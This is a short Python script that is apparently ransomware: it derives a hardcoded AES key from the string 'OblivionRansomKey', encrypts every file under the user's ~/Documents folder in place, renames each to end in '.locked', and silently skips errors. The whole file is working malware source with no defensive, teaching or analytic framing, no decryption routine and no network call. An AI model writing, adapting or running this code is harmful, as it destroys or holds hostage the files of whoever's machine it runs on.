import os
from Crypto.Cipher import AES
import base64
import hashlib

KEY = hashlib.sha256(b"OblivionRansomKey").digest()

def encrypt_file(file_path):
    with open(file_path, "rb") as f:
        data = f.read()
    cipher = AES.new(KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(file_path, "wb") as f:
        f.write(cipher.nonce + tag + ciphertext)

def encrypt_directory(path):
    for root, dirs, files in os.walk(path):
        for file in files:
            if not file.endswith(".locked"):
                full_path = os.path.join(root, file)
                try:
                    encrypt_file(full_path)
                    os.rename(full_path, full_path + ".locked")
                except Exception:
                    continue

def main():
    target = os.path.expanduser("~/Documents")
    encrypt_directory(target)
